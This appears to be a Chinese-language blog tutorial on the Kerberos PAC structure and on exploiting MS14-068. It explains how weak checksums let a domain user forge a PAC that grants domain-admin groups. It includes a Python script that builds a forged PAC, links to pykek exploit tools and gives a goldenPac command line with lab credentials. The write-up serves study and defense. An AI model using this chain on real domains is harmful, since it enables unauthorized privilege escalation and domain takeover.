## PAC介绍

PAC由微软为了访问控制而引入，用于解决用户是否有权限访问目标服务的验证

+ 在AS_REQ流程中，请求凭据是用户hash加密的内容，如果解密正确KDC会返回krbtgt hash加密的TGT，TGT中就包含了PAC，PAC中包含了用户的sid,用户所在的组
+ 在TGS_REQ流程中，用户原样返回TGT票据附带时间戳等信息，KDC使用krbtgt hash进行解密，成功则返回服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，这也是kerberoating能利用的原因，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据)
+ 服务使用自身的hash解密用户发来的TGS票据，使用其中的PAC去KDC询问用户是否有权限访问该服务，**域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）**就允许用户访问。

## PAC结构

![image001](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/image001.png)

授权数据元素 AD-IF-RELEVANT是最外层的包装器。它封装了另一个类型为 AD-WIN2K-PAC 的 AuthorizationData 元素。此结构内部是 PACTYPE 结构，它用作实际 PAC 元素的标头。头部PACTYPE包括`cBuffers`,`版本`以及`缓冲区`，`PAC_INFO_BUFFER`为key-value型的

| 类型       | 意义                                                         |
| ---------- | ------------------------------------------------------------ |
| 0x00000001 | 登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。 |
| 0x00000002 | 凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。 |
| 0x00000006 | 服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。 |
| 0x00000007 | KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。 |
| 0x0000000A | 客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。 |
| 0x0000000B | 受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。 |
| 0x0000000C | 用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。 |
| 0x0000000D | 客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。 |
| 0x0000000E | 设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。 |
| 0x0000000F | 设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。 |

+ 0x00000001   **KERB_VALIDATION_INFO**  

  登录信息，PAC使用该条目验证用户身份，整体是一个结构体

  ```shell
  typedef struct _KERB_VALIDATION_INFO {
     FILETIME LogonTime;
     FILETIME LogoffTime;
     FILETIME KickOffTime;
     FILETIME PasswordLastSet;
     FILETIME PasswordCanChange;
     FILETIME PasswordMustChange;
     RPC_UNICODE_STRING EffectiveName;
     RPC_UNICODE_STRING FullName;
     RPC_UNICODE_STRING LogonScript;
     RPC_UNICODE_STRING ProfilePath;
     RPC_UNICODE_STRING HomeDirectory;
     RPC_UNICODE_STRING HomeDirectoryDrive;
     USHORT LogonCount;
     USHORT BadPasswordCount;
     ULONG UserId; //用户的sid
     ULONG PrimaryGroupId; 
     ULONG GroupCount;
     [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;//用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管
     ULONG UserFlags;
     USER_SESSION_KEY UserSessionKey;
     RPC_UNICODE_STRING LogonServer;
     RPC_UNICODE_STRING LogonDomainName;
     PISID LogonDomainId;
     ULONG Reserved1[2];
     ULONG UserAccountControl;
     ULONG SubAuthStatus;
     FILETIME LastSuccessfulILogon;
     FILETIME LastFailedILogon;
     ULONG FailedILogonCount;
     ULONG Reserved3;
     ULONG SidCount;
     [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;
     PISID ResourceGroupDomainSid;
     ULONG ResourceGroupCount;
     [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;
  } KERB_VALIDATION_INFO;
  ```

  

  - 0x0000000A **PAC_CLIENT_INFO**

  - 客户端Id（8个字节）：

    包含在Kerberos初始TGT的authtime

  - NameLength（2字节）

    用于指定Name 字段的长度（以字节为单位）。

  - Name

    包含客户帐户名的16位Unicode字符数组，格式为低端字节序。

  - 0x00000006和0x00000007 0x00000006 对应的是服务检验和，0x00000007 对应的是KDC校验和。分别由server密码和KDC密码加密，是为了防止PAC内容被篡改。

    存在签名的原因有两个。首先，存在带有服务器密钥的签名，以防止客户端生成自己的PAC并将其作为加密授权数据发送到KDC，以包含在票证中。其次，提供具有KDC密钥的签名，以防止不受信任的服务伪造带有无效PAC的票证。

    两个都是PAC_SIGNATURE_DATA结构，他包括以下结构。 1. SignatureType（4个字节）

  | 类型       | 含义                   | 签名长度 |
  | ---------- | ---------------------- | -------- |
  | 0xFFFFFF76 | KERB_CHECKSUM_HMAC_MD5 | 16       |
  | 0x0000000F | HMAC_SHA1_96_AES128    | 12       |
  | 0x00000010 | HMAC_SHA1_96_AES256    | 12       |

## MS14068

**Microsoft Windows Kerberos KDC无法正确检查Kerberos票证请求随附的特权属性证书（PAC）中的有效签名**

导致用户可以自己构造一张PAC

签名原本的设计是要用到HMAC系列的checksum算法，也就是必须要有key的参与，我们没有krbtgt的hash以及服务的hash，就没有办法生成有效的签名，但是问题就出在，实现的时候允许所有的checksum算法都可以，包括MD5。那我们只需要把PAC 进行md5，就生成新的校验和。这也就意味着我们可以随意更改PAC的内容，完了之后再用md5 给他生成一个服务检验和以及KDC校验和。在MS14-068修补程序之后，Microsoft添加了一个附加的验证步骤，以确保校验和类型为KRB_CHECKSUM_HMAC_MD5。

**目标：修改groupid 将当前用户加入到特殊组中，例如域管等**

pykek加入的是以下组,

- 域用户（513）
- 域管理员（512）
- 架构管理员（518）
- 企业管理员（519）
- 组策略创建者所有者（520）

现在我们已经明白了如何伪造PAC，常规情况下PAC是放在TGT内的，TGT由krbtgt的hash进行加密，我们无法得到这个hash即使能够伪造PAC，我们又怎么传递给KDC呢。pykek的作者将PAC加密成密文放在enc-authorization-data里面，enc-authorization-data的结构如下

```shell
AuthorizationData::= SEQUENCE OF SEQUENCE {
    ad-type[0] Int32,
    ad-data[1] OCTET STRING
 }
```

ad-type是加密算法 ad-data是pac加密后的内容 加密用的key是客户端生成的。KDC并不知道这个key。KDC会从PA-DATA里面的AP_REQ获取到这个key。从而对ad-data进行解密，然后拿到PAC，再检查校验和。 

![1](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/1.png)

这是TGS_REQ的必选项，我们需要导入上一步得到的TGT票据，而得到TGT票据是不含PAC的

AP-REQ的定义

```
AP-REQ  ::= [APPLICATION 14] SEQUENCE {
        pvno            [0] INTEGER (5),
        msg-type        [1] INTEGER (14),
        ap-options      [2] APOptions,
        ticket          [3] Ticket,
        authenticator   [4] EncryptedData -- Authenticator
}
```

TGT票据就放在ticket中， authenticator 的内容包括加密类型和用session_key加密Authenticator加密成的密文。 Authenticator的结构如下

```shell
Authenticator ::= [APPLICATION 2] SEQUENCE  {
     authenticator-vno       [0] INTEGER (5),
     crealm                  [1] Realm,
     cname                   [2] PrincipalName,
     cksum                   [3] Checksum OPTIONAL,
     cusec                   [4] Microseconds,
     ctime                   [5] KerberosTime,
     subkey                  [6] EncryptionKey OPTIONAL,
     seq-number              [7] UInt32 OPTIONAL,
     authorization-data      [8] AuthorizationData OPTIONAL
}
```

其中加密PAC的密钥就放在subkey里面,KDC拿到AP_REQ之后，提取里面authenticator的密文，用session_key解密获得subkey，再使用subkey解密enc-authorization-data获得PAC.而PAC是我们自己伪造的.

+ 申请一个不包含PAC的TGT票据

+ 伪造PAC，这里用daiker写好的脚本

  ```python
  from kek.pac import build_pac
  from kek.util import gt2epoch
  from kek.krb5 import AD_WIN2K_PAC, AuthorizationData, AD_IF_RELEVANT
  from pyasn1.codec.der.encoder import encode
  
  if __name__ == '__main__':
      user_realm = "hack.com"  # 改成自己的
      user_name = "hacker"  # 改成自己的
      user_sid = "S-1-5-21-754643614-3937478331-2139222398-1116"  # 改成自己的
      logon_time = gt2epoch('20231019064418Z')
      authorization_data = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))
      ad1 = AuthorizationData()
      ad1[0] = None
      ad1[0]['ad-type'] = authorization_data[0]
      ad1[0]['ad-data'] = authorization_data[1]
      ad = AuthorizationData()
      ad[0] = None
      ad[0]['ad-type'] = AD_IF_RELEVANT
      ad[0]['ad-data'] = encode(ad1)
      data = encode(ad)
      with open("jack.pac", "wb") as f:
          f.write(data)
  注意这里的运行环境是python2
  ```

+ 导入PAC，申请TGS票据

  ![2](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/2.png)

因为申请的是krbtgt服务，因此导出的TGS票据可以当作TGT使用

+ 在低权限主机上导入该票据，并开启一个cmdshell

  ![3](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/3.png)

### 脚本利用

Pykek

```
py：https://github.com/mubix/pykek
exe：https://github.com/ianxtianxt/MS14-068
```

![4](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/4.png)

glodenPAC

psexec和ms14068结合的产物

```
 python goldenPac.py -dc-ip 192.168.30.10 -target-ip 192.168.30.10 hack.com/hacker:\!qaz@WSX@DC.hack.com
```